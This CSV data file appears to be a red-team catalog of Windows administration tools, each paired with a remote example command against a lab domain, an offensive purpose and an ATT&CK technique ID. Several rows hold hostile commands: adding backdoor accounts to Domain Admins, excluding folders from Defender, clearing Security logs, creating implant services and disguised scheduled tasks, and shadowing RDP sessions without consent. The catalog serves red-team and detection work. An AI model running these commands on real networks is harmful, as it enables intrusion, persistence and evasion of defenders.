"Add-NetEventPacketCaptureProvider","Adds a Remote Packet Capture provider","2023-11-04","[''Builtin''-|-''CIMSession'']","","Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical -TruncationLength ([UInt16]::MaxValue)","Add packet capture provider to eventsession","Sniff authentication traffic on a domain controller and locally crack the hashes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See all details in [New-NetEventSession](../New-NetEventSession)''-|-''Can be opened using for example NetworkMiner or Wireshark''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-MpPreference","Modifies settings for Windows Defender","2023-07-01","[''Builtin''-|-''CIMSession'']","","Add-MpPreference -ExclusionPath 'C:\EvilTools' -CimSession $s","Exclude path from AV","Exclude path from AV so malicious tools can be stored there","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-EtwTraceProvider","Adds an ETW trace provider to an ETW Autologger configuration or ETW session","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Add-EtwTraceProvider -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `EventTracingManagement`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-DnsClientNrptRule","Adds a rule to the NRPT","2023-07-01","[''CIMSession''-|-''TODO'']","","Add-DnsClientNrptRule -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsClient`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Add-ADGroupMember","Adds one or more members to an Active Directory group","2023-07-01","RSAT","","Add-ADGroupMember 'Domain Admins' -Members Hacker","Add user to domain group","Add a user to a certain domain group to obtain certain privileges","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"wmic.exe","Command-line interface for Windows Management Instrumentation (WMI)","2023-07-01","Builtin","","[''wmic.exe /node:W10.ad.bitsadmin.com process call create ""beacon.exe""''-|-''wmic.exe /node:W10.ad.bitsadmin.com /output:processes.csv process list /format:CSV'']","[''Launch process''-|-''Query processes'']","[''Launch implant''-|-''Reconnaissance on running processes'']","[''Execute''-|-''Processes'']","[''None''-|-''None'']","[''T1047''-|-''T1057''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"winrs.exe","Manage and execute programs remotely","2023-07-01","Builtin","","[''winrs.exe -r:W10.ad.bitsadmin.com ipconfig /all''-|-''winrs.exe -r:W10.ad.bitsadmin.com cmd'']","[''Execute WinRM command''-|-''Launch interactive shell'']","[''Perform reconnaissance or launch implant''-|-''None'']","[''Execute''-|-''Execute'']","[''None''-|-''None'']","[''T1021.006''-|-''T1059.001''-|-''T1021.006'']","None","None","","Arris Huijgen","bitsadmin","","false"
"wevtutil.exe","Windows Events Command Line Utility","2024-12-14","Builtin","","wevtutil /remote:CAROOT1.ad.bitsadmin.com cl Security","Clear security event log","Cover tracks clearing past events","Recon","See also [Clear-EventLog](../../Cmdlets/Clear-Eventlog)","T1070.001","None","None","","Arris Huijgen","bitsadmin","","false"
"waitfor.exe","Sends or waits for a signal on a system","2023-07-01","[''Builtin''-|-''TODO'']","","waitfor.exe","TODO","None","Misc","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"w32tm.exe","Synchronize the date and time","2023-07-01","Builtin","","w32tm.exe /query /computer:W10.ad.bitsadmin.com /status /verbose","Show time details","None","Recon","None","T1124","None","None","","Arris Huijgen","bitsadmin","","false"
"volrest.exe","Previous Version command-line tool","2023-08-25","Extra","","volrest.exe \\W10.ad.bitsadmin.com\C$\Windows\System32\Config","List snapshots of network share","List snapshots of the config directory and then copy the `SAM`/`SECURITY`/`SYSTEM` files from that snapshot","Data","[''Also known as volume shadow copies''-|-''Part of the Windows Server 2003 Resource Kit'']","[''T1083''-|-''T1003.002'']","https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system","None","","Arris Huijgen","bitsadmin","","false"
"uptime.exe","Display uptime of a system","2023-07-01","Extra","","uptime.exe W10.ad.bitsadmin.com","Show uptime","Identify if a machine could be relevant for longer term persistence without having to install persistence","Recon","None","T1082","None","None","","Arris Huijgen","bitsadmin","","false"
"typeperf.exe","Writes performance data to the command window or to a log file","2023-07-01","[''Builtin''-|-''TODO'']","","typeperf.exe ""\\W10.ad.bitsadmin.com\Processor(0)\% User Time""","TODO","None","Logs","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"tskill.exe","Ends a process","2023-07-01","Builtin","","tskill.exe cmd /Server:W10.ad.bitsadmin.com /A /V","Kill a process","Terminate a process","Processes","None","T1562.001","None","None","","Arris Huijgen","bitsadmin","","false"
"tsdiscon.exe","Disconnects a session from a Remote Desktop Session Host (RD Session Host) server","2023-07-01","Builtin","","tsdiscon.exe rdp-tcp#1 /server:W10.ad.bitsadmin.com","Disconnect a user","None","Sessions","None","T1531","None","None","","Arris Huijgen","bitsadmin","","false"
"tasklist.exe","Displays a list of currently running processes","2023-07-01","Builtin","","tasklist.exe /S W10.ad.bitsadmin.com /FO CSV > W10_tasklist.csv","List processes","Perform reconnaissance on executing processes","Processes","None","T1057","None","None","","Arris Huijgen","bitsadmin","","false"
"taskkill.exe","Terminate tasks by process id (PID) or image name","2023-07-01","Builtin","","taskkill.exe /S W10.ad.bitsadmin.com /F /IM cmd.exe","Kill a process","Terminate a process","Processes","None","T1562.001","None","None","","Arris Huijgen","bitsadmin","","false"
"takeown.exe","Allows an administrator to recover access to a file that was denied by re-assigning file ownership","2023-07-01","[''Builtin''-|-''TODO'']","","takeown.exe /S system /F MyShare\Acme*.doc","Take ownership over a file","Alter permissions","Data","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"systeminfo.exe","Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties","2023-08-25","Builtin","","systeminfo.exe /S W10.ad.bitsadmin.com","Show system information","List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities","Recon","None","T1082","https://blog.bitsadmin.com/windows-security-updates-for-hackers","None","","Arris Huijgen","bitsadmin","","false"
"ssh.exe","Secure Shell client","2024-12-13","Builtin","","ssh.exe -Kv myuser@linux.ad.bitsadmin.com","Connect to SSH server using Kerberos","Lateral movement","Sessions","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"srvinfo.exe","Gather information about a target server","2023-07-01","Extra","","srvinfo.exe \\DC1.ad.bitsadmin.com","List computer information","List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities","Recon","[''Similar to [systeminfo.exe](../systeminfo)''-|-''Part of the Windows Server 2003 Resource Kit'']","T1082","None","None","","Arris Huijgen","bitsadmin","","false"
"srvcheck.exe","Server share check","2023-07-01","Extra","","srvcheck.exe \\DC1.ad.bitsadmin.com","Displays a list of server shares and who has access","None","Data","Part of the Windows Server 2003 Resource Kit","T1135","None","None","","Arris Huijgen","bitsadmin","","false"
"sqlcmd.exe","Integrated environment for managing any SQL infrastructure, from SQL Server to Azure SQL Database","2023-07-01","Extra","","sqlcmd.exe -S SQL1.ad.bitsadmin.com\SQLEXPRESS","SQL Server Command Line Tool","Connect to MSSQL database and execute commands on the underlying OS using the `xp_cmdshell` stored procedure, execute CLR code or pivot over MSSQL server links","Manage","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"shutdown.exe","Shut down or restart local or remote computers, one at a time","2023-07-01","Builtin","","shutdown.exe /r /f /t 0 /m \\W10.ad.bitsadmin.com","Restart machine","Affect availability of a computer","Sessions","None","T1529","None","None","","Arris Huijgen","bitsadmin","","false"
"shrpubw.exe","Create a Shared Folder Wizard","2024-12-13","[''Builtin''-|-''GUI'']","","shrpubw /s W10.ad.bitsadmin.com","Create a Shared Folder Wizard","Add (hidden - dollar share) shared folder","Manage","Alternatively, use [fsmgmt.msc](../../MMC/fsmgmt)","[''T1135''-|-''T1021.002'']","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"shadow.exe","Remotely control an active session of another user on a Remote Desktop Session Host server","2023-08-25","Builtin","","shadow.exe 3 /SERVER:W10.ad.bitsadmin.com","RDP shadow a user session","None","Sessions","Starting from Windows 8/Server 2012 this binary is replaced with `mstsc.exe`","T1563.002","https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing","None","","Arris Huijgen","bitsadmin","","false"
"setx.exe","Modifies the value of a service's entries in the registry and in the Service Control Manager database","2023-07-01","Builtin","","setx.exe /S W10.ad.bitsadmin.com /M MYVAR ""Hello there!""","Set machine-wide environment variables","Configure a path order hijack","Registry","None","T1112","None","None","","Arris Huijgen","bitsadmin","","false"
"setspn.exe","Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account","2023-07-01","Builtin","","[''setspn.exe -L ad.bitsadmin.com\SP2019''-|-''setspn.exe -T ad.bitsadmin.com -Q */*''-|-''setspn.exe -S HTTP/EXCH2019.ad.bitsadmin.com EXCH2019'']","[''List SPNs for a specific account''-|-''List all SPNs in the domain''-|-''Set SPN'']","[''Reconnaissance''-|-''Reconnaissance''-|-''Add an SPN to a user for a targeted Kerberoast'']","[''Domain''-|-''Domain''-|-''Domain'']","[''Can be both a regular account as well as a computer account''-|-''None''-|-''Error when execution from Offensive Windows VM: `Ldap Error(0x51 -- Server Down): ldap_connect; Failed to retrieve DN for domain """" : 0x00000051; Warning: No valid targets specified, reverting to current domain.; FindDomainForAccount: Call to DsGetDcNameWithAccountW failed with return value 0x0000054B; Unable to locate account SP2019`'']","[''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"sdelete.exe","Secure file delete","2023-07-01","Sysinternals","","sdelete \\W10.ad.bitsadmin.com\C$\backdoor.exe","Securely delete a file","Cleanup of traces","Data","None","T1070.004","None","None","","Arris Huijgen","bitsadmin","","false"
"scp.exe","Secure Copy","2024-12-13","Builtin","","scp.exe -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes myuser@linux.ad.bitsadmin.com:/tmp/file.tgz file.tgz","Copy file locally from SSH server authenticating using Kerberos","[''Data collection''-|-''Tool transfer'']","Data","None","T1105","None","None","","Arris Huijgen","bitsadmin","","false"
"schtasks.exe","Create, delete, query, change, run and end scheduled tasks","2023-11-04","Builtin","","[''schtasks.exe /S W10.ad.bitsadmin.com /Create /RU SYSTEM /SC HOURLY /TN ""Microsoft\Windows\Printing\Print Spooler (x64)"" /TR ""C:\Windows\System32\spoolsv64.exe""''-|-''schtasks.exe /S W10.ad.bitsadmin.com'']","[''Create new task''-|-''List tasks'']","[''Command execution through scheduled task''-|-''Persistence by registering a scheduled task''-|-''List current tasks to identify a name that can be used for a new task to blend in'']","[''Execute''-|-''Recon'']","[''None''-|-''None'']","[''T1053.005''-|-''T1053.005'']","None","None","","Arris Huijgen","bitsadmin","","false"
"sc.exe","Interact with the Service Control Manager database","2023-07-01","Builtin","","[''sc.exe \\W10.ad.bitsadmin.com create MyService binpath= C:\Windows\implant.exe''-|-''sc.exe \\W10.ad.bitsadmin.com config wuauserv start= disabled''-|-''sc.exe \\W10.ad.bitsadmin.com query''-|-''sc.exe \\W10.ad.bitsadmin.com start MyService''-|-''sc.exe \\W10.ad.bitsadmin.com stop wuauserv'']","[''Create service''-|-''Disable service''-|-''List services''-|-''Start service''-|-''Stop service'']","[''Create service pointing to implant binary''-|-''Impair security defenses''-|-''Reconnaissance of installed services''-|-''Launch implant''-|-''Impair security defenses'']","[''Execute''-|-''Execute''-|-''Recon''-|-''Execute''-|-''Execute'']","[''None''-|-''None''-|-''None''-|-''None''-|-''None'']","[''T1569.002''-|-''T1543.003''-|-''T1489''-|-''TA0043''-|-''T1569.002''-|-''T1489'']","None","None","","Arris Huijgen","bitsadmin","","false"
"rwinsta.exe","Reset the session subsytem hardware and software to known initial values","2023-07-01","Builtin","","rwinsta.exe 1 /SERVER:W10.ad.bitsadmin.com /V","TODO","None","Sessions","[''Sessions can be queried using [qwinsta.exe](../qwinsta)''-|-''Equivalent to [reset.exe](../reset)'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"rpcdump.exe","RPC endpoint diagnostic utility","2023-07-01","Extra","","rpcdump.exe /S W10.ad.bitsadmin.com /V /I > W10.txt","List RPC endpoints","Identify whether certain services or software is running based on the available RPC interfaces","Recon","Part of the Windows Server 2003 Resource Kit","TA0043","None","None","","Arris Huijgen","bitsadmin","","false"
"reset.exe","Reset the session subsytem hardware and software to known initial values","2023-07-01","Builtin","","reset.exe session 1 /SERVER:W10.ad.bitsadmin.com /V","Logoff user","None","Sessions","[''Sessions can be queried using [qwinsta.exe](../qwinsta)''-|-''Equivalent to [rwinsta.exe](../rwinsta)'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"repadmin.exe","Diagnose Active Directory replication problems between domain controllers","2023-07-01","Builtin","","repadmin.exe /replsummary /homeserver:DC1.ad.bitsadmin.com","Show replication state","None","Data","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"rendom.exe","Performs various actions necessary for a domain rename operation","2023-07-01","[''Builtin''-|-''TODO'']","","rendom.exe","TODO","None","Domain","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"regini.exe","Modifies the registry from the command line or a script","2023-07-01","[''Builtin''-|-''TODO'']","","regini.exe -m \\W10.ad.bitsadmin.com mybackdoor.ini","Import ini into registry of remote system","Add registry persistence","Registry","None","T1112","None","None","","Arris Huijgen","bitsadmin","","false"
"regedit.exe","Registry Editor","2023-07-01","[''Builtin''-|-''GUI'']","","regedit.exe","Registry Editor","[''Read secrets from the registry''-|-''Add persistence'']","Registry","File -> Connect Network Registry","[''T1012''-|-''T1112'']","None","None","","Arris Huijgen","bitsadmin","","false"
"reg.exe","Query and edit the registry","2023-07-01","Builtin","","[''reg.exe query ""\\W10.ad.bitsadmin.com\HKLM\Software\Microsoft\Windows\CurrentVersion\Run""''-|-''reg.exe add \\W10.ad.bitsadmin.com\HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD'']","[''Query registry key''-|-''Set registry value'']","[''Query registry autoruns''-|-''Configure the remote system, e.g. to support Kerberos authentication for remote desktop''-|-''Configure the automatic start of an implant upon boot'']","[''Registry''-|-''Registry'']","[''None''-|-''None'']","[''T1012''-|-''T1547.001''-|-''T1112'']","None","None","","Arris Huijgen","bitsadmin","","false"
"qwinsta.exe","Display information about Remote Desktop Services sessions","2024-12-13","Builtin","","qwinsta.exe /server:W10.ad.bitsadmin.com","List listeners and interactive sessions","Check whether the system has high-privileged users logged in to then laterally move to it","Sessions","Equivalent to [query.exe](../query) session","None","None","None","","Arris Huijgen","bitsadmin","","false"
"quser.exe","Displays information about user sessions on a Remote Desktop Session Host server","2024-12-13","Builtin","","quser.exe /server:W10.ad.bitsadmin.com","List logged in users","Check whether the system has high-privileged users logged in to then laterally move to it","Sessions","Equivalent to [query.exe](../query) user","None","None","None","","Arris Huijgen","bitsadmin","","false"
"query.exe","Displays information about processes, sessions, and Remote Desktop Session Host servers","2024-12-13","Builtin","","[''query.exe session /server:W10.ad.bitsadmin.com''-|-''query.exe user /server:W10.ad.bitsadmin.com''-|-''query.exe process /server:W10.ad.bitsadmin.com *''-|-''query.exe process /server:W10.ad.bitsadmin.com keepass.exe''-|-''query.exe termserver'']","[''List listeners and interactive sessions''-|-''List logged in users''-|-''List all processes''-|-''List all processes''-|-''List terminal servers on the network'']","[''Reconnaissance on currently active sessions''-|-''Reconnaissance on currently active users''-|-''Reconnaissance on running processes''-|-''Identify specific running process''-|-''None'']","[''Sessions''-|-''Sessions''-|-''Processes''-|-''Processes''-|-''Sessions'']","[''Equivalent to [qwinsta.exe](../qwinsta)''-|-''Equivalent to [quser.exe](../quser)''-|-''Equivalent to [qprocess.exe](../qprocess)''-|-''Equivalent to [qprocess.exe](../qprocess)''-|-''Equivalent to [qappsrv.exe](../qappsrv)'']","[''None''-|-''None''-|-''T1057''-|-''T1057''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"qprocess.exe","Displays information about processes that are running on a Remote Desktop Session Host server","2024-12-13","Builtin","","[''qprocess.exe /server:W10.ad.bitsadmin.com DomainUser2''-|-''qprocess.exe /server:W10.ad.bitsadmin.com *'']","[''List all processes''-|-''List all processes'']","[''Reconnaissance on running processes for a specific user''-|-''Reconnaissance on running processes'']","[''Processes''-|-''Processes'']","[''None''-|-''Equivalent to [query.exe](../query) process'']","[''T1057''-|-''T1057'']","None","None","","Arris Huijgen","bitsadmin","","false"
"qappsrv.exe","Displays the available Remote Desktop Session Host servers on the network","2024-12-13","Builtin","","qappsrv dc1.ad.bitsadmin.com","Display information about Remote Desktop Session Host server","None","Manage","Equivalent to [query.exe](../query) termserver","None","None","None","","Arris Huijgen","bitsadmin","","false"
"pssuspend.exe","Suspends or resumes processes on a local or remote system","2023-07-01","Sysinternals","","[''pssuspend.exe -r \\W10.ad.bitsadmin.com procexp.exe''-|-''pssuspend.exe \\W10.ad.bitsadmin.com procexp.exe'']","[''Resume process''-|-''Suspend process'']","[''None''-|-''Alternative to terminating a process'']","[''Processes''-|-''Processes'']","[''Installs PsSuspend service''-|-''Installs PsSuspend service'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"psshutdown.exe","Shutdown, logoff and power manage local and remote systems","2023-07-01","Sysinternals","","psshutdown.exe -f -k \\W10.ad.bitsadmin.com","Shutdown computer","Affect availability of a computer","Sessions","Makes use of a service that is installed on the remote system. Better make use of [shutdown.exe](../shutdown)","T1529","None","None","","Arris Huijgen","bitsadmin","","false"
"psservice.exe","Lists or controls services on a local or remote system","2023-07-01","Sysinternals","","psservice.exe \\W10.ad.bitsadmin.com config","List services","Reconnaissance of installed services","Processes","None","T1569.002","None","None","","Arris Huijgen","bitsadmin","","false"
"psping.exe","Implements Ping functionality, TCP ping, UDP/TCP latency, and UDP / TCP bandwidth measurement","2023-07-01","[''Sysinternals''-|-''TODO'']","","psping.exe","TODO","None","Network","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"pspasswd.exe","Changes passwords on a local or remote system","2023-07-01","Sysinternals","","pspasswd.exe \\W10.ad.bitsadmin.com MyUser MyNewPassword","Update password","Update a user's password","Sessions","None","T1531","None","None","","Arris Huijgen","bitsadmin","","false"
"psloglist.exe","Dumps event logs on a local or remote system","2023-07-01","Sysinternals","","[''psloglist.exe -nobanner -i 99999 -c \\W10.ad.bitsadmin.com Security''-|-''psloglist.exe -nobanner -s \\W10.ad.bitsadmin.com Security'']","[''Clear Security event log''-|-''List events in the Security event log'']","[''Cover tracks clearing past logon events''-|-''Identify which IPs logons of privileged users are originating from'']","[''Logs''-|-''Logs'']","[''Be aware that this leaves an event stating that the Security event log has been cleared (event id 1102)''-|-''None'']","[''T1070.001''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"psloggedon.exe","See who's logged on","2023-07-01","Sysinternals","","[''psloggedon.exe -nobanner \\W10.ad.bitsadmin.com''-|-''psloggedon.exe \\W10.ad.bitsadmin.com'']","[''List both interactive sessions and sessions to shares''-|-''Show sessions'']","[''None''-|-''Reconnaissance on currently active users'']","[''Sessions''-|-''Sessions'']","[''None''-|-''None'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"pslist.exe","Process information lister","2023-07-01","[''Sysinternals''-|-''TODO'']","","pslist.exe -nobanner \\W10.ad.bitsadmin.com","List all processes","Reconnaissance on running processes","Processes","None","T1057","None","None","","Arris Huijgen","bitsadmin","","false"
"pskill.exe","Terminates processes on local or remote systems","2023-07-01","[''Sysinternals''-|-''TODO'']","","pskill.exe","TODO","None","Processes","None","T1562.001","None","None","","Arris Huijgen","bitsadmin","","false"
"psinfo.exe","Local and remote system information viewer","2023-07-01","Sysinternals","","psinfo.exe \\W10.ad.bitsadmin.com","Show basic information","Reconnaissance on system information","Recon","Similar to [systeminfo.exe](../systeminfo)","T1082","None","None","","Arris Huijgen","bitsadmin","","false"
"psgetsid.exe","Translates SIDs to names and vice versa","2023-07-01","Sysinternals","","[''psgetsid.exe \\W10.ad.bitsadmin.com''-|-''psgetsid.exe \\W10.ad.bitsadmin.com Administrator'']","[''Resolve computer SID''-|-''Resolve SID of user'']","[''None''-|-''None'']","[''Recon''-|-''Recon'']","[''Installs service on remote system''-|-''Installs service on remote system'']","[''TA0043''-|-''TA0043'']","None","None","","Arris Huijgen","bitsadmin","","false"
"psfile.exe","Lists or closes files opened remotely","2023-07-01","[''Sysinternals''-|-''TODO'']","","psfile.exe -nobanner \\W10.ad.bitsadmin.com","List files opened remotely","None","Data","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"psexec.exe","Executes a program on a remote system, where remotely executed console applications execute interactively","2023-07-01","Sysinternals","","psexec.exe \\W10.ad.bitsadmin.com -s cmd.exe /c net user hacker hacker /add ^&^& net localgroup Administrators hacker /add","Execute commands","[''In this example adds a backdoor user''-|-''Can also be used to launch an implant'']","Execute","Installs PSEXESVC service on remote system","T1569.002","None","None","","Arris Huijgen","bitsadmin","","false"
"printui.exe","Automates many printer configuration tasks","2023-07-01","[''Builtin''-|-''GUI'']","","rundll32.exe printui.dll,PrintUIEntry /im /c\\W10.ad.bitsadmin.com","Add printer","None","Misc","Launches the ""Add Printer"" wizard","None","None","None","","Arris Huijgen","bitsadmin","","false"
"portqry.exe","Displays the state of TCP and UDP ports","2023-07-01","Extra","","portqry.exe -n DC1.ad.bitsadmin.com -e 135","Enumerate RPC endpoints","Reconnaissance of available RPC interfaces","Network","Download PortQry from the resource link","[''T1046''-|-''T1007'']","https://www.microsoft.com/en-us/download/details.aspx?id=17148","None","","Arris Huijgen","bitsadmin","","false"
"nslookup.exe","Displays information that you can use to diagnose Domain Name System (DNS) infrastructure","2023-07-01","Builtin","","nslookup.exe -q=srv _ldap._tcp.ad.bitsadmin.com","List LDAP servers","Identify DC IPs","Network","For more DNS domain-related DNS queries, see the link in the resources on DNS-Based Discovery","T1590.002","https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7fcdce70-5205-44d6-9c3a-260e616a2f04","None","","Arris Huijgen","bitsadmin","","false"
"nltest.exe","Perform network administrative tasks","2023-07-01","RSAT","","[''nltest.exe /domain_trusts /all_trusts /v /server:DC1.ad.bitsadmin.com''-|-''nltest.exe /SHUTDOWN:"""" 0 /SERVER:W10.ad.bitsadmin.com'']","[''List domain trusts''-|-''Shutdown machine'']","[''Understand the setup of the Active Directory forest''-|-''Make machine unavailable'']","[''Domain''-|-''Sessions'']","[''None''-|-''None'']","[''None''-|-''T1529'']","None","None","","Arris Huijgen","bitsadmin","","false"
"nlb.exe","Manage Network Load Balancing (NLB)","2023-07-01","[''Server''-|-''TODO'']","","nlb.exe","TODO","None","Network","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"netsh.exe","Display or modify the network configuration","2023-08-25","Builtin","","[''netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall show rule name=""Remote Desktop - Shadow (TCP-In)""''-|-''netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall set rule name=""Remote Desktop - Shadow (TCP-In)"" new enable=yes'']","[''Show firewall rule''-|-''Enable firewall rule'']","[''Determine the configuration of a certain firewall rule and whether it is active''-|-''For example usage, see the Spying on users using RDP shadowing blog post (see resources)''-|-''Enable firewall rule''-|-''For example usage, see the Spying on users using RDP shadowing blog post (see resources)'']","[''Network''-|-''Network'']","[''None''-|-''None'']","[''T1562.004''-|-''T1562.004'']","https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing","None","","Arris Huijgen","bitsadmin","","false"
"netdom.exe","Manage Active Directory domains and trust relationships from the command prompt","2023-07-01","[''RSAT''-|-''Server'']","","[''netdom.exe join %computername% /domain:ad.bitsadmin.com''-|-''netdom.exe trust'']","[''Join machine to domain''-|-''Add a trust'']","[''None''-|-''None'']","[''Domain''-|-''Domain'']","[''Be aware that this will also push group policies and potentially security solutions''-|-''TODO: Complete command'']","[''None''-|-''T1484.002'']","None","None","","Arris Huijgen","bitsadmin","","false"
"net.exe","Functionalities related to querying and modifying the domain, services, shares and users","2023-08-25","Builtin","","[''net.exe view \\W10.ad.bitsadmin.com /all''-|-''net.exe view \\W10.ad.bitsadmin.com''-|-''net.exe time \\W10.ad.bitsadmin.com''-|-''net.exe user backdoor Password1! /add /domain''-|-''net.exe user Administrator NewPassword1! /domain''-|-''net.exe group ""Domain Admins"" backdoor /add /domain'']","[''List all shares''-|-''List shares''-|-''Show time''-|-''Create new domain account''-|-''Update password''-|-''Add user to domain group'']","[''Identify all shares, including hidden ones to enumerate for sensitive information''-|-''Search for files on shares with credential material''-|-''Identify files that can be backdoored''-|-''None''-|-''Add backdoor account to the domain''-|-''Overwrite the password of a domain user''-|-''Add user to the ""Domain Admins"" group'']","[''Data''-|-''Data''-|-''Recon''-|-''Domain''-|-''Domain''-|-''Domain'']","[''None''-|-''None''-|-''None''-|-''None''-|-''None''-|-''None'']","[''T1135''-|-''T1135''-|-''T1124''-|-''T1136.002''-|-''T1078.002''-|-''None''-|-''None'']","https://blog.bitsadmin.com/digging-for-secrets","None","","Arris Huijgen","bitsadmin","","false"
"ndkping.exe","RDMA Ping Cmd","2023-07-01","[''Builtin''-|-''TODO'']","","ndkping.exe","TODO","None","Network","Not sure what this is for","None","None","None","","Arris Huijgen","bitsadmin","","false"
"mstsc.exe","Connect to the desktop of remote computers","2024-12-13","[''Builtin''-|-''GUI'']","","[''mstsc.exe /v:SP2019.ad.bitsadmin.com /shadow:1 /noConsentPrompt /control''-|-''mstsc.exe /remoteGuard /v:SP2019.ad.bitsadmin.com''-|-''mstsc.exe /v:SP2019.ad.bitsadmin.com /shadow:1 /noConsentPrompt'']","[''Control a user's session''-|-''Remote Desktop''-|-''Shadow a user'']","[''Take over when a user is idle''-|-''Connect to a target server''-|-''Exfiltrate data over RDP clipboard or `\\tsclient` drives''-|-''If RDP provides access to a different network segment, SocksOverRDP can be used to pivot into that segment''-|-''Spy on a user's activity'']","[''Sessions''-|-''Sessions''-|-''Sessions'']","[''None''-|-''See also [RDCMan.exe](../RDCMan)''-|-''None'']","[''T1021.001''-|-''T1021.001''-|-''T1021.001'']","https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing","None","","Arris Huijgen","bitsadmin","","false"
"msra.exe","Windows Remote Assistance","2023-07-01","[''Builtin''-|-''TODO'']","","msra.exe","TODO","None","Sessions","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"msinfo32.exe","Show system information","2023-07-01","[''Builtin''-|-''GUI'']","","msinfo32.exe","System Information","Show system information","Recon","View -> Remote Computer (Ctrl + R)","T1082","None","None","","Arris Huijgen","bitsadmin","","false"
"msg.exe","Send a message to a user","2023-07-01","[''Builtin''-|-''TODO'']","","msg.exe","TODO","None","Sessions","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"mofcomp.exe","Parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository","2023-07-01","[''Builtin''-|-''TODO'']","","mofcomp.exe -N:\\W10.ad.bitsadmin.com\root\subscription .\backdoor.mof","Create persistence","None","Execute","None","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"manage-bde.exe","BitLocker Drive Encryption Configuration Tool","2023-07-01","[''Builtin''-|-''TODO'']","","manage-bde.exe -ComputerName W10.ad.bitsadmin.com","TODO","None","Data","None","T1486","None","None","","Arris Huijgen","bitsadmin","","false"
"logoff.exe","Terminates a session","2023-07-01","Builtin","","logoff.exe rdp-tcp#0 /SERVER:W10.ad.bitsadmin.com","Logoff user","Force logoff of a user","Sessions","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"logman.exe","Creates and manages Event Trace Session and Performance logs and supports many functions of Performance Monitor from the command line","2023-07-01","Builtin","","logman.exe query providers -s W10.ad.bitsadmin.com","List ETW providers","Identify ETW providers of security solutions that are installed, e.g. Sysinternals Sysmon's `Microsoft-Windows-Sysmon provider`","Logs","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"local.exe","Displays members of local groups on remote servers or domains","2023-07-01","Extra","","[''local.exe Administrators \\W10.ad.bitsadmin.com''-|-''local.exe ""Domain Admins"" ad.bitsadmin.com'']","[''List members of the Administrators group''-|-''List members of the ""Domain Admins"" group'']","[''Reconnaissance''-|-''Reconnaissance'']","[''Manage''-|-''Manage'']","[''Part of the Windows 2000 Resource Kit''-|-''Part of the Windows 2000 Resource Kit'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"ldifde.exe","LDIF Directory Exchange","2023-07-01","[''RSAT''-|-''TODO'']","","ldifde.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"gpresult.exe","Displays the Resultant Set of Policy (RSoP) information for a remote user and computer","2023-07-01","Builtin","","gpresult.exe /S W10.ad.bitsadmin.com /SCOPE COMPUTER /X W10.xml","Save effective policies to XML","Understand group policies that are applicable","Recon","None","TA0043","None","None","","Arris Huijgen","bitsadmin","","false"
"gpfixup.exe","Group Policy fix up utility","2023-07-01","[''RSAT''-|-''TODO'']","","gpfixup.exe","TODO","None","Domain","Not sure if part of RSAT or not","None","None","None","","Arris Huijgen","bitsadmin","","false"
"getmac.exe","Returns the media access control (MAC) address and list of network protocols associated with each address for all network cards in each computer","2023-07-01","Builtin","","getmac.exe /V /S W10.ad.bitsadmin.com","List network adapters","None","Network","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
